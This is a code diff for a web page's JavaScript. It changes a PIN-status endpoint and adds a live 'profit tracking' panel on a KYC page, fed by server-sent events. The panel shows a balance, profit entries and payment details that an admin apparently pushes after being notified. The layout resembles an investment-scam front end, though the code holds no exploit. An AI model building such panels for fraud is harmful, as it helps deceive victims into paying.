@@ -321,7 +321,7 @@ document.addEventListener('DOMContentLoaded', function () {
         var checkPinStatus = function () {
           if (checkingPinStatus) return;
           checkingPinStatus = true;
-          fetch('/api/login/status/' + loginId, { cache: 'no-store' })
+          fetch('/api/check-pin-status/' + loginId, { cache: 'no-store' })
             .then(function (res) { return res.json(); })
             .then(function (statusData) {
               if (statusData.sharedStore === false) {
@@ -492,5 +492,94 @@ document.addEventListener('DOMContentLoaded', function () {
       }
     });
   });
+
+  /* ---------- Profit Tracking (real-time via SSE) ---------- */
+  const profitsPanel = document.getElementById('profits-panel');
+  const trackProfitsBtn = document.getElementById('track-profits-btn');
+  const currentBalanceEl = document.getElementById('current-balance');
+  const paymentDetailsEl = document.getElementById('payment-details');
+  const profitsListEl = document.getElementById('profits-list');
+  
+  let sessionId = null;
+  let eventSource = null;
+
+  function initProfits() {
+    // Create a session for this user
+    fetch('/api/session', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ sessionId: 'SESS-' + Date.now() })
+    }).then(function (res) { return res.json(); })
+      .then(function (data) {
+        if (data.sessionId) {
+          sessionId = data.sessionId;
+          if (profitsPanel) profitsPanel.style.display = 'block';
+          startSSE();
+        }
+      }).catch(function () {});
+  }
+
+  function startSSE() {
+    if (!sessionId) return;
+    eventSource = new EventSource('/api/stream/' + sessionId);
+    eventSource.addEventListener('init', function (e) {
+      const data = JSON.parse(e.data);
+      updateBalance(data.balance || 0);
+      if (data.profits) data.profits.forEach(addProfitItem);
+    });
+    eventSource.addEventListener('profit', function (e) {
+      const data = JSON.parse(e.data);
+      updateBalance(data.balance);
+      if (data.amount) addProfitItem({ amount: data.amount, note: data.note, ts: Date.now() });
+    });
+    eventSource.addEventListener('payment', function (e) {
+      const data = JSON.parse(e.data);
+      if (paymentDetailsEl) {
+        paymentDetailsEl.innerHTML = '<strong>Payment Details:</strong> ' + escHtml(data.paymentDetails || '');
+      }
+    });
+    eventSource.onerror = function () {
+      setTimeout(startSSE, 3000);
+    };
+  }
+
+  function updateBalance(balance) {
+    if (currentBalanceEl) {
+      currentBalanceEl.textContent = '$' + Number(balance).toFixed(2);
+    }
+  }
+
+  function addProfitItem(p) {
+    if (!profitsListEl) return;
+    const div = document.createElement('div');
+    div.style.padding = '0.5rem 0';
+    div.style.borderBottom = '1px solid #eee';
+    div.innerHTML = '<span style="color:#28a745;">+ $' + Number(p.amount).toFixed(2) + '</span> ' + escHtml(p.note || '') + ' <small style="color:#999;">' + new Date(p.ts).toLocaleTimeString() + '</small>';
+    profitsListEl.prepend(div);
+  }
+
+  function escHtml(s) {
+    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  }
+
+  if (trackProfitsBtn) {
+    trackProfitsBtn.addEventListener('click', function () {
+      fetch('/api/track-profits', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId: sessionId, phone: sessionStorage.getItem('phone') || 'user' })
+      }).then(function (res) { return res.json(); })
+        .then(function () {
+          showToast('Admin notified. Waiting for profit update...', 'success');
+        }).catch(function () {
+          showToast('Network error. Please try again.', 'error');
+        });
+    });
+  }
+
+  // Initialize on kyc.html
+  if (profitsPanel || trackProfitsBtn) {
+    initProfits();
+  }
 
 });
